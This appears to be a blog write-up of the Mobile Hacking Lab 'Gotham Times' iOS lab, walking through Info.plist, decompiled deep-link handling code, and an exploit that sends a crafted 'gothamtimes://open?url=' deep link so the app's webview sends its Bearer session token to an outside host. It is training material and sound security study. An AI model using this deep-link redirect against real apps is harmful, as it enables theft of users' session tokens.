---
layout: post
title: Gotham Times - Mobile Hacking Lab
color: rgb(51,122,183)
tags: [Mobile Hacking lab, iOS Security]
comments: true
share: false
excerpt_separator: <!--more-->
---


The [Gotham Times](https://www.mobilehackinglab.com/course/lab-gotham-times) lab offers a deep dive into how webviews function in iOS and how vulnerabilities in them can be exploited using deep links, in this case to steal a session token via open redirect. <!--more--> In this article, we will explore the step-by-step process from identifying the vulnerability to successfully exploiting it.

### Introduction 

Upon launching the application, we are presented with a login screen and an option to navigate to the registration screen. After creating an account and logging in, we are taken to the authenticated section of the app where we can view a list of news articles and profile information. Nothing seems unusual at first, so let's dig deeper into the application.

### Static Analysis

First, let’s examine the `Info.plist` file where we find that the app has a custom URL scheme.

```xml
<key>CFBundleURLTypes</key>
	<array>
		<dict>
			<key>CFBundleTypeRole</key>
			<string>Viewer</string>
			<key>CFBundleURLName</key>
			<string>com.mobilehackinglab.Gotham-Times</string>
			<key>CFBundleURLSchemes</key>
			<array>
				<string>gothamtimes</string>
			</array>
		</dict>
	</array>
```

This means the app can be opened via a deep link using a URL like:

```xml
gothamtimes://data
```

With this information, let’s load the main application binary into Ghidra.

Before analyzing functions, let's demangle names to make the reverse engineering process easier. For this, we use a Ghidra script created by [Laurie Wired](https://github.com/LaurieWired/iOS_Reverse_Engineering/blob/main/SwiftNameDemangler.py).

Now, looking at the reversed code, we find an interesting method named `_TtC12Gotham_Times13SceneDelegate::scene:openURLContexts` that handles opening URLs via deep links.

```c
// _TtC12Gotham_Times13SceneDelegate::scene:openURLContexts

/* Function Stack Size: 0x20 bytes */

void _TtC12Gotham_Times13SceneDelegate::scene:openURLContexts:
               (ID param_1,SEL param_2,ID param_3,ID param_4)

{
  undefined8 uVar1;
  undefined8 uVar2;
  
  _objc_retain();
  _objc_retain(param_4);
  _objc_retain(param_1);
  uVar1 = type_metadata_accessor_for_UIOpenURLContext(0);
  uVar2 = lazy_protocol_witness_table_accessor_for_type_UIOpenURLContext_and_conformance_NSObject();
  uVar1 = static_Set._unconditionallyBridgeFromObjectiveC(param_4,uVar1,uVar2);
  SceneDelegate.scene(param_3);
  _swift_bridgeObjectRelease(uVar1);
  _objc_release(param_4);
  _objc_release(param_1);
  _objc_release(param_3);
  return;
}
```

This method calls `SceneDelegate.scene(param_3)`. In this method, we see how the deep link is structured for use by the application. It fetches the host part of the URL and checks if it is equal to `open`, forming a URL like `gothamtimes://open`. Further, it fetches the query string to see if it contains the key `url`, resulting in a format like `gothamtimes://open?url=https://someurl.com`.

```c
  //SceneDelegate.scene
  //...
  _objc_retain();
  local_1f0 = local_1e0;
  if (local_1e0 != 0) {
    local_1f8 = local_1e0;
    local_210 = local_1e0;
    local_78 = local_1e0;
    _swift_bridgeObjectRetain(param_2);
    local_208 = type_metadata_accessor_for_UIOpenURLContext(0);
    uVar9 = lazy_protocol_witness_table_accessor_for_type_UIOpenURLContext_and_conformance_NSObject
                      ();
    local_200 = auStack_58;
    Set.makeIterator(param_2,local_208,uVar9);
    _memcpy(auStack_a0,local_200,0x28);
    while( true ) {
      ___swift_instantiateConcreteTypeFromMangledName
                (&demangling_cache_variable_for_type_metadata_for_Set_UIOpenURLContext_.Iterator);
      Set.Iterator.next(&local_a8);
      local_218 = local_a8;
      if (local_a8 == 0) break;
      local_220 = local_a8;
      local_260 = local_a8;
      local_b0 = local_a8;
      auVar13 = _allocateUninitializedArray_A_(1,puVar1);
      local_2a0 = auVar13._8_8_;
      local_298 = auVar13._0_8_;
      local_268 = &objc::protocol_t::WKUIDelegate;
      _objc_msgSend(local_260,"URL");
      local_290 = _objc_retainAutoreleasedReturnValue();
      static_URL._unconditionallyBridgeFromObjectiveC(lVar4);
      *(long *)(local_2a0 + 0x18) = lVar8;
      uVar9 = ___swift_allocate_boxed_opaque_existential_0();
      (**(code **)(lVar11 + 0x20))(uVar9,lVar4,lVar8);
      local_270 = _finalizeUninitializedArray_A_(local_298,puVar1);
      _objc_release(local_290);
      auVar13 = default_argument_1_of_print();
      local_278 = auVar13._8_8_;
      local_288 = auVar13._0_8_;
      auVar13 = default_argument_2_of_print();
      local_280 = auVar13._8_8_;
      print(local_270,local_288,local_278,auVar13._0_8_);
      _swift_bridgeObjectRelease(local_280);
      _swift_bridgeObjectRelease(local_278);
      _swift_bridgeObjectRelease(local_270);
      _objc_msgSend(local_260,local_268[0x2e].instanceProperties);
      local_258 = _objc_retainAutoreleasedReturnValue();
      static_URL._unconditionallyBridgeFromObjectiveC(lVar3);
      local_250 = *(code **)(lVar11 + 0x10);
      (*local_250)(lVar2,lVar3,lVar8);
      auVar13 = URL.host.getter();
      local_248 = *(code **)(lVar11 + 8);
      local_238 = auVar13;
      (*local_248)(lVar2,lVar8);
      (*local_248)(lVar3,lVar8);
      _swift_bridgeObjectRetain(local_238._8_8_);
      auVar13 = String.init("open",4,1);
      local_228 = auVar13._8_8_;
      local_240 = auVar13._0_8_;
      _swift_bridgeObjectRetain();
      local_c0 = local_240;
      local_b8 = local_228;
      local_d0 = local_238;
      if (local_238._8_8_ == 0) {
        if (local_228 != 0) goto LAB_1000195a4;
        outlined_destroy_of_String?(local_d0);
        local_2a4 = 1;
      }
      else {
        outlined_init_with_copy_of_String?(local_d0,&local_140);
        if (local_b8 == 0) {
          outlined_destroy_of_String(&local_140);
LAB_1000195a4:
          outlined_destroy_of_(local_d0);
          local_2a4 = 0;
        }
        else {
          local_2d0 = local_140;
          local_2b8 = local_138;
          _swift_bridgeObjectRetain();
          local_2c8 = local_c0;
          local_2b0 = local_d0;
          local_2c0 = local_b8;
          _swift_bridgeObjectRetain();
          local_2a8 = static_String.==_infix(local_2d0,local_2b8,local_2c8,local_2c0);
          _swift_bridgeObjectRelease(local_2c0);
          _swift_bridgeObjectRelease(local_2b8);
          _swift_bridgeObjectRelease(local_2c0);
          _swift_bridgeObjectRelease(local_2b8);
          outlined_destroy_of_String?(local_2b0);
          local_2a4 = local_2a8;
        }
      }
      local_2d4 = local_2a4;
      _swift_bridgeObjectRelease(local_228);
      _swift_bridgeObjectRelease(local_238._8_8_);
      _objc_release(local_258);
      if ((local_2d4 & 1) != 0) {
        _objc_msgSend(local_260,"URL");
        local_2f0 = _objc_retainAutoreleasedReturnValue();
        static_URL._unconditionallyBridgeFromObjectiveC(lVar4);
        (*local_250)(lVar12,lVar4,lVar8);
        auVar13 = URL.absoluteString.getter();
        local_2f8 = auVar13._8_8_;
        local_308 = auVar13._0_8_;
        puVar10 = unaff_x20;
        (*local_248)(lVar12,lVar8);
        (*local_248)(lVar4,lVar8);
        auVar13 = String.init("url",3,1);
        local_300 = auVar13._8_8_;
        auVar13 = (**(code **)((*unaff_x20 & *(ulong *)puVar5) + 0x78))
                            (local_308,local_2f8,auVar13._0_8_);
        local_2e8._0_16_ = auVar13;
        _swift_bridgeObjectRelease(local_300);
        _swift_bridgeObjectRelease(local_2f8);
        _objc_release(local_2f0);
        local_e0 = local_2e8._0_16_;
        local_f0 = local_2e8._0_16_;
        outlined_init_with_copy_of_String?(local_f0,auStack_100);
        bVar7 = local_f8 != 0;
        unaff_x20 = puVar10;
        if (bVar7) {
          outlined_destroy_of_String?(auStack_100);
          unaff_x20 = puVar10;
        }
      //...  
      
```

### Exploiting the Application


First, open the application and log in as you normally would. With the app running in the background, scan a QR code generated with the text `gothamtimes://open?url=https://bernasv.com`. This action reveals an open redirect vulnerability in the app.

Examining the request in Burp, we see the following:

```
GET / HTTP/1.1
Host: bernasv.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Flag: FLAG{d33ply-l1nk3d(t0-w3bk1t}
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3RlIiwiaWF0IjoxNzE3ODM2NjgwfQ.lJmud2xM88GFhG9a3EorXpdaQhpJF_Qwil_blGd-atM
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive
```

We can steal the session token sent in the request within the webview, which is supposed to be used only for the host `mhl.pages.dev`. Here we have two vulnerabilities:

- **Open Redirect Vulnerability** : The application should sanitize the input to prevent opening arbitrary sites.
- **Session Token Theft Vulnerability**: By combining the open redirect flaw, we can send the session token to a site controlled by the attacker.



### Conclusion

This lab serves as a valuable lesson in understanding the security implications of loading URLs within a WebView in iOS applications. By exploiting vulnerabilities like this, it’s possible to load malicious sites and steal session tokens. For a hands-on experience with these concepts, visit the lab at [MobileHackingLab - Gotham Times](https://www.mobilehackinglab.com/course/lab-gotham-times). Embark on a journey of discovery and bolster your expertise in mobile security.